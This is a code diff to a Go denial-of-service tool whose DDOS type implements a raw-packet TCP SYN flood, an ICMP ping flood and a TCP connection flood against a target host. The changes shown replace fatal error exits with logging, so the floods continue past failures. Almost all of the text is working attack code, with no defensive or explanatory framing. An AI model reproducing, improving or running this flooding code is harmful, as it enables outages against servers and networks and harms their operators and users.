@@ -83,29 +83,29 @@ func (a *DDOS) TCPAttack() {
 	ipHeaderBuf := gopacket.NewSerializeBuffer()
 	err := ip.SerializeTo(ipHeaderBuf, opts)
 	if err != nil {
-		log.Fatal("Error while serializing data")
+		log.Println("Error while serializing data")
 	}
 	ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
 	if err != nil {
-		log.Fatal("Error while parsing header")
+		log.Println("Error while parsing header")
 	}
 
 	tcpPayloadBuf := gopacket.NewSerializeBuffer()
 	payload := gopacket.Payload([]byte("hola"))
 	err = gopacket.SerializeLayers(tcpPayloadBuf, opts, &tcp, payload)
 	if err != nil {
-		log.Fatal("Error while serializing data")
+		log.Println("Error while serializing data")
 	}
 
 	var packetConn net.PacketConn
 	var rawConn *ipv4.RawConn
-	packetConn, err = net.ListenPacket("ip4:tcp", "127.0.0.1")
+	packetConn, err = net.ListenPacket("ip4:tcp", "localhost")
 	if err != nil {
-		log.Fatal("Error while listening for connection")
+		log.Println("Error while listening for connection " + err.Error())
 	}
 	rawConn, err = ipv4.NewRawConn(packetConn)
 	if err != nil {
-		log.Fatal("Error while sending raw packet")
+		log.Println("Error while sending raw packet")
 	}
 	if a.AttackType == "1" {
 		tcp.SYN = true
@@ -118,7 +118,7 @@ func (a *DDOS) TCPAttack() {
 		for i := 0; i < 1000; i++ {
 			err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil)
 			if err != nil {
-				log.Fatal("Error while send data")
+				log.Println("Error while sending data " + err.Error())
 			}
 		}
 	}
@@ -130,12 +130,12 @@ func (a *DDOS) ICMPAttack() {
 	for totalPackets > 0 {
 		pinger, err := ping.NewPinger(a.Host)
 		if err != nil {
-			log.Fatal("Error while creating pinger object " + err.Error())
+			log.Println("Error while creating pinger object " + err.Error())
 		}
 		pinger.Count = 100
 		err = pinger.Run()
 		if err != nil {
-			log.Fatal("Error while executing ICMP Flood attack " + err.Error())
+			log.Println("Error while executing ICMP Flood attack " + err.Error())
 		}
 		statistics := pinger.Statistics()
 		fmt.Println(statistics)
@@ -150,7 +150,7 @@ func (a *DDOS) HttpFlood() {
 	for totalPackets > 0 {
 		con, err := net.Dial("tcp", target)
 		if err != nil {
-			log.Fatal("Http request failed " + err.Error())
+			log.Println("Http request failed " + err.Error())
 		}
 		con.Close()
 	}
